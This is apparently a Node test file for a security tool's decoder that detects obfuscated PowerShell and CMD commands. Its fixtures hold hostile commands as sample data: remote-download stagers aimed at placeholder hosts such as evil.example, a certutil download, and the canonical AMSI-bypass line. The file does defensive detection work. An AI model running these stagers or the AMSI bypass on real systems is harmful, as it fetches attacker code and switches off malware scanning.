'use strict';
// cmd-obfuscation-phase1.test.js — Phase-1 additions under src/decoders/
// cmd-obfuscation.js. Covers nine new branches added in the "script
// deobfuscator deep-fill" pass:
//
//   PowerShell:
//     1. -EncodedCommand / -enc / -ec (UTF-16LE base64)
//     2. [char]N + [char]N + … reassembly (decimal, hex, [System.Char])
//     3. [Convert]::FromBase64String + [Encoding]::*.GetString
//     4. -bxor inline-key byte-array decode
//     5. [scriptblock]::Create('…').Invoke()
//     6. AMSI-bypass pattern (AmsiUtils.amsiInitFailed)
//
//   CMD:
//     7. set /a arithmetic-to-character block
//     8. call :label indirection
//
// Each test asserts BOTH that a candidate of the expected technique is
// emitted AND that the deobfuscated string contains the planted sentinel
// token. Cross-branch regressions surface as shape mismatches
// (typically the technique label drifted) or missing-sentinel failures.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/cmd-obfuscation.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

function pick(cands, pred) { return host(cands.filter(pred)); }

function toB64Utf16LE(text) {
  const bytes = Buffer.alloc(text.length * 2);
  for (let i = 0; i < text.length; i++) {
    const cc = text.charCodeAt(i);
    bytes[i * 2]     = cc & 0xff;
    bytes[i * 2 + 1] = (cc >> 8) & 0xff;
  }
  return bytes.toString('base64');
}
function toB64Utf8(text) { return Buffer.from(text, 'utf8').toString('base64'); }

// ── 1. PowerShell -EncodedCommand ────────────────────────────────────────

test('ps -EncodedCommand: decodes canonical UTF-16LE base64 stager', () => {
  const inner = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.example/p.ps1")';
  const b64 = toB64Utf16LE(inner);
  const text = `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64}`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const enc = pick(cands, c => /EncodedCommand/.test(c.technique));
  assert.ok(enc.length >= 1, `expected -EncodedCommand candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(enc[0].deobfuscated, /DownloadString/);
});

test('ps -EncodedCommand: accepts -enc / -Enc short-forms', () => {
  const inner = 'Invoke-Expression iex; whoami';
  const b64 = toB64Utf16LE(inner);
  for (const flag of ['-enc', '-Enc', '-ec']) {
    const text = `pwsh -NoP ${flag} ${b64}`;
    const cands = d._findCommandObfuscationCandidates(text, {});
    const enc = pick(cands, c => /EncodedCommand/.test(c.technique));
    assert.ok(enc.length >= 1, `flag=${flag} failed: ${JSON.stringify(host(cands))}`);
    assert.match(enc[0].deobfuscated, /Invoke-Expression/i);
  }
});

test('ps -EncodedCommand: does NOT fire on random short base64', () => {
  // A short 8-char b64 that decodes to printable noise without any
  // exec-intent keyword must be suppressed.
  const text = '-ec YWFhYWFhYWE=';
  const cands = d._findCommandObfuscationCandidates(text, {});
  const enc = pick(cands, c => /EncodedCommand/.test(c.technique));
  assert.equal(enc.length, 0, `expected suppression on noise; got: ${JSON.stringify(enc)}`);
});

test('ps -EncodedCommand: carries _patternIocs mirror for risk escalation', () => {
  const inner = 'iex $(iwr http://e/p)';
  const b64 = toB64Utf16LE(inner);
  const text = `powershell.exe -enc ${b64}`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const enc = pick(cands, c => /EncodedCommand/.test(c.technique));
  assert.ok(enc[0]._patternIocs && enc[0]._patternIocs.length >= 1);
  assert.match(enc[0]._patternIocs[0].url, /T1059\.001|stager/i);
});

// ── 2. [char]N + [char]N reassembly ──────────────────────────────────────

test('ps [char] reassembly: hex form `[char]0xNN + …` spells keyword', () => {
  const kw = 'IEX';
  const src = kw.split('').map(c => `[char]0x${c.charCodeAt(0).toString(16)}`).join('+');
  const cands = d._findCommandObfuscationCandidates(`(${src})`, {});
  const ch = pick(cands, c => /\[char\]N/.test(c.technique));
  assert.ok(ch.length >= 1, `expected [char]N candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(ch[0].deobfuscated, /IEX/);
});

test('ps [char] reassembly: decimal form', () => {
  const kw = 'powershell';
  const src = kw.split('').map(c => `[char]${c.charCodeAt(0)}`).join(' + ');
  const cands = d._findCommandObfuscationCandidates(`& (${src})`, {});
  const ch = pick(cands, c => /\[char\]N/.test(c.technique));
  assert.ok(ch.length >= 1);
  assert.match(ch[0].deobfuscated, /powershell/);
});

test('ps [char] reassembly: suppresses ABC-style benign joins', () => {
  // `[char]65+[char]66+[char]67+[char]68` → 'ABCD' — no exec-intent,
  // no SENSITIVE_CMD_KEYWORDS hit, must NOT emit.
  const cands = d._findCommandObfuscationCandidates(
    '[char]65+[char]66+[char]67+[char]68', {}
  );
  const ch = pick(cands, c => /\[char\]N/.test(c.technique));
  assert.equal(ch.length, 0);
});

// ── 3. [Convert]::FromBase64String + Encoding.GetString ──────────────────

test('ps [Convert]::FromBase64String + UTF8.GetString: decodes literal arg', () => {
  const inner = 'Invoke-Expression $cmd; whoami /all';
  const b64 = toB64Utf8(inner);
  const text = `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${b64}'))`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const conv = pick(cands, c => /FromBase64String.*GetString/.test(c.technique));
  assert.ok(conv.length >= 1, `expected FromBase64String candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(conv[0].deobfuscated, /Invoke-Expression/);
});

test('ps [Convert]::FromBase64String + Unicode.GetString: UTF-16LE decode', () => {
  const inner = 'certutil -urlcache -f http://e/p p.exe';
  const b64 = toB64Utf16LE(inner);
  const text = `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("${b64}"))`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const conv = pick(cands, c => /FromBase64String.*UNICODE/.test(c.technique));
  assert.ok(conv.length >= 1);
  assert.match(conv[0].deobfuscated, /certutil/);
});

// ── 4. -bxor inline-key decode ───────────────────────────────────────────

test('ps -bxor inline-key: decodes printable payload', () => {
  const pl = 'Invoke-Expression iex';
  const key = 0x5a;
  const nums = [...pl].map(c => (c.charCodeAt(0) ^ key).toString()).join(',');
  const text = `$b = @(${nums}); $b | ForEach-Object { [char]($_ -bxor ${key}) }`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const bx = pick(cands, c => /-bxor/.test(c.technique));
  assert.ok(bx.length >= 1, `expected -bxor candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(bx[0].deobfuscated, /Invoke-Expression/);
});

test('ps -bxor inline-key: accepts 0xHH key + emits IOC.PATTERN mirror', () => {
  const pl = 'powershell.exe -Command whoami';
  const key = 0x42;
  const nums = [...pl].map(c => (c.charCodeAt(0) ^ key).toString()).join(',');
  const text = `@(${nums}) | % { $_ -bxor 0x${key.toString(16)} }`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const bx = pick(cands, c => /-bxor/.test(c.technique));
  assert.ok(bx.length >= 1);
  assert.ok(bx[0]._patternIocs && bx[0]._patternIocs[0].url.includes('XOR'));
});

// ── 5. [scriptblock]::Create(…).Invoke() ─────────────────────────────────

test('ps [scriptblock]::Create: literal arg surfaced as deobfuscated body', () => {
  // Use double-quoted outer string + single-quoted inner arg so the
  // body stays balanced (no embedded `'` in the inner literal).
  const body = 'Invoke-Expression (iwr "http://e/p").Content';
  const text = `[scriptblock]::Create('${body}').Invoke()`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const sb = pick(cands, c => /scriptblock/.test(c.technique));
  assert.ok(sb.length >= 1, `expected scriptblock candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(sb[0].deobfuscated, /Invoke-Expression/);
});

test('ps [scriptblock]::Create: ScriptBlock casing + fully-qualified form', () => {
  const body = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/s")';
  const text = `[System.Management.Automation.ScriptBlock]::Create('${body}').Invoke()`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const sb = pick(cands, c => /scriptblock/.test(c.technique));
  assert.ok(sb.length >= 1);
});

// ── 6. AMSI bypass ───────────────────────────────────────────────────────

test('ps AMSI bypass: recognises canonical AmsiUtils.amsiInitFailed pattern', () => {
  const text = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
  const cands = d._findCommandObfuscationCandidates(text, {});
  const amsi = pick(cands, c => /AMSI/.test(c.technique));
  assert.ok(amsi.length >= 1, `expected AMSI candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(amsi[0]._patternIocs[0].severity, 'critical');
});

test('ps AMSI bypass: matches concat-split `amsi`+`InitFailed` form', () => {
  const text = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsi'+'InitFailed','NonPublic,Static')";
  const cands = d._findCommandObfuscationCandidates(text, {});
  const amsi = pick(cands, c => /AMSI/.test(c.technique));
  assert.ok(amsi.length >= 1);
});

// ── 7. CMD set /a arithmetic-to-character ────────────────────────────────

test('cmd set /a arithmetic: decodes per-var ASCII to command name', () => {
  const cmd = 'whoami';
  const decl = cmd.split('').map((c, i) => `set /a V${i}=${c.charCodeAt(0)}`).join(' & ');
  const text = `${decl} & echo done`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const sa = pick(cands, c => /set \/a/.test(c.technique));
  assert.ok(sa.length >= 1, `expected set /a candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(sa[0].deobfuscated, /whoami/);
});

test('cmd set /a arithmetic: accepts 0xNN hex values', () => {
  const cmd = 'powershell';
  const decl = cmd.split('').map((c, i) => `set /a V${i}=0x${c.charCodeAt(0).toString(16)}`).join(' & ');
  const cands = d._findCommandObfuscationCandidates(`${decl}\n`, {});
  const sa = pick(cands, c => /set \/a/.test(c.technique));
  assert.ok(sa.length >= 1);
  assert.match(sa[0].deobfuscated, /powershell/);
});

// ── 8. call :label indirection ───────────────────────────────────────────

test('cmd call :label: resolves label body to a LOLBin', () => {
  const text = [
    '@echo off',
    'call :runit',
    'goto :eof',
    ':runit',
    'powershell.exe -NoProfile -Command "Invoke-Expression (iwr http://e/p)"',
    'goto :eof',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {});
  const lbl = pick(cands, c => /call :label/.test(c.technique));
  assert.ok(lbl.length >= 1, `expected call :label candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(lbl[0].deobfuscated, /powershell/);
});

test('cmd call :label: ignores benign `call :helper` (no LOLBin body)', () => {
  const text = [
    'call :helper',
    ':helper',
    'echo configuration loaded',
    'exit /b 0',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {});
  const lbl = pick(cands, c => /call :label/.test(c.technique));
  assert.equal(lbl.length, 0);
});

// ── 9. Amp-budget invariant across every new branch ──────────────────────

test('phase-1 branches: every candidate honours the 32× / 8 KiB amp cap', () => {
  // A single fixture that trips every new branch simultaneously.
  const inner = 'IEX (iwr http://e/a)';
  const b64u16 = toB64Utf16LE(inner);
  const b64u8  = toB64Utf8(inner);
  const bxKey  = 0x5a;
  const bxNums = [...inner].map(c => (c.charCodeAt(0) ^ bxKey).toString()).join(',');
  const setA   = 'whoami'.split('').map((c, i) => `set /a W${i}=${c.charCodeAt(0)}`).join(' & ');
  const text = [
    `powershell -enc ${b64u16}`,
    `& ([char]0x49+[char]0x45+[char]0x58)`,
    `[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64u8}'))`,
    `@(${bxNums}) | % { $_ -bxor ${bxKey} }`,
    `[scriptblock]::Create('IEX $x').Invoke()`,
    `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')`,
    setA,
    'call :ex',
    ':ex',
    'powershell.exe -Command whoami',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {});
  for (const c of cands) {
    if (typeof c.deobfuscated === 'string' && typeof c.raw === 'string') {
      const cap = Math.min(8 * 1024, 32 * Math.max(1, c.raw.length));
      assert.ok(
        c.deobfuscated.length <= cap,
        `amp-budget violation: technique=${c.technique} raw=${c.raw.length} deobf=${c.deobfuscated.length} cap=${cap}`
      );
    }
  }
});
